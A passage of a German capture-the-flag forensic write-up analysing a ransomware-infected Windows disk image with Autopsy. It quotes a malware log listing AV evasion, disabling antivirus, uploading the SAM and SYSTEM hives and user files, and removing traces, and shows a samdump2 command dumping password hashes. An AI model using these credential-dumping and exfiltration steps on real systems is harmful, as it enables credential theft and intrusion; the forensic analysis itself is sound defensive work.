Meine Ausgangsbasis war ja auf einem Ubuntu Linux System und Autopsy als Webinterface:
![Bayerns Bester Hacker 2021 Challenge 2 - Autopsy Webinterface](Screenshots/BBH2021C2_Autopsy-Webinterface.jpg)

Auch bei genauerem Hinsehen ergibt es hier keine Dateien, die noch aus dem Laufwerk ausgelesen werden können oder, wie oben über ntfsundelete und ntfs-3g Tools beschrieben, angezeigt werden können:
![Bayerns Bester Hacker 2021 Challenge 2 - Dateien in Autopsy, nicht im Drive](Screenshots/BBH2021C2_Drive-vs-Autopsy-Desktop.jpg)

@AlexHofbauer hat mir aber den Hinweis gegeben, dass die Windows-Version gleicher Software hier durchaus Ergebnisse zutage fördert und diese hilfreich sind:
![Bayerns Bester Hacker 2021 Challenge 2 - Ergebnis Windows Autopsy](Screenshots/BBH2021C2_Autopsy-Windows-firemail.png)

![Bayerns Bester Hacker 2021 Challenge 2 - Output Suche nach Infektionsweg](Screenshots/BBH2021C2_Autopsy-Windows-firemail-Output.png)


Denn das schließt genau die Bewertung ab, wie wir den Infektionsweg beschrieben haben.

Wichtig ist, dass diese Module geladen werden:
Image | Modules
------|--------
![Bayerns Bester Hacker 2021 Challenge 2 - Autopsy Windows Desktop](Screenshots/BBH2021C2_Autopsy-Windows-Desktop-Module.png) | ![Bayerns Bester Hacker 2021 Challenge 2 - Autopsy Windows Module](Screenshots/BBH2021C2_Autopsy-Windows-Desktop-Module2.png)


# Fazit

Die Infektion fand über ein PDF statt und lud dann die Schadcodes über die ```powershell``` nach. Das Verschlüsseln der Dateien fand dann durch eine Rechte-Ausweitung (priviledge escalation) als System-User im Task Scheduler statt.

Die Log-Datei [aadbg.log](aadbg.log) gibt gleichermaßen einen Aufschluss über das Vorgehen und wird hier stark verkürzt wiedergegeben:
```
Faking Image...
done
AV evasion...
done
Disabeling AV...
done
Creating Task...
done
Removing Task XML
Done
Reading passwords of target...
Uploading C:\sam
Uploading C:\System
Done
Uploading / stealing files...
Uploading Users.FullName
Uploading Administrator.FullName
Uploading l.maier.FullName
Uploading m.schmitt.FullName
...
Uploading actionqueueetw.dll.mui.FullName
done
Removing traces...
done
```


# Parkplatz

Vorhandene User im System: 
* Adminstrator
* User
* l.maier
* m.schmitt

```
Windows/System32/config$ samdump2 SYSTEM SAM
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Gast:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
User:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Auch Zugriffe über die Gruppenrichtlinien aus dem Netzwerk:
```
<TimeCreated SystemTime="2021-08-07 09:24:20.215910"></TimeCreated>
<EventRecordID>4766</EventRecordID>
<Correlation ActivityID="{3cb12cf0-119a-4a7c-8597-fdb19bdbd5fa}" RelatedActivityID=""></Correlation>
<Execution ProcessID="8932" ThreadID="1724"></Execution>
<Channel>Microsoft-Windows-GroupPolicy/Operational</Channel>
<Computer>DESKTOP-B&#220;RO1.rae-schmitt.de</Computer>
<Security UserID="S-1-5-18"></Security>
</System>
<EventData><Data Name="OperationDescription">%%4131</Data>
<Data Name="Parameter">\\rae-schmitt.de\sysvol\rae-schmitt.de\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\gpt.ini</Data>
<Data Name="Parameter">CN=DESKTOP-B&#220;RO1,CN=Computers,DC=rae-schmitt,DC=de</Data>
```

Sowie komische Hosts und User:
```
<Computer>WIN-TMIR4Q453TA</Computer>
<Security UserID=""></Security>
</System>
<EventData><Data Name="TargetUserName">Leistungs&#252;berwachungsbenutzer</Data>
<Data Name="TargetDomainName">Builtin</Data>
<Data Name="TargetSid">S-1-5-32-558</Data>
<Data Name="SubjectUserSid">S-1-5-18</Data>
<Data Name="SubjectUserName">MINWINPC$</Data>
<Data Name="SubjectDomainName"></Data>
<Data Name="SubjectLogonId">0x00000000000003e7</Data>
<Data Name="PrivilegeList">-</Data>
<Data Name="SamAccountName">Leistungs&#252;berwachungsbenutzer</Data>
<Data Name="SidHistory">-</Data>
```

Interessant, da erste Tabelle _DataEncryptionKeys_ enthält:
```
Users/l.maier/AppData/Local/ConnectedDevicesPlatform/L.l.maier$ file *
ActivitiesCache.db:     SQLite 3.x database, last written using SQLite version 3029000
ActivitiesCache.db-shm: data
ActivitiesCache.db-wal: SQLite Write-Ahead Log, version 3007000
README.txt:             ASCII text
```

```.sh```-Dateiendung als Standardanwendung Notepad ausgewählt
![Bayerns Bester Hacker 2021 Challenge 2 - ](Screenshots/BBH2021C2_sh.jpg)
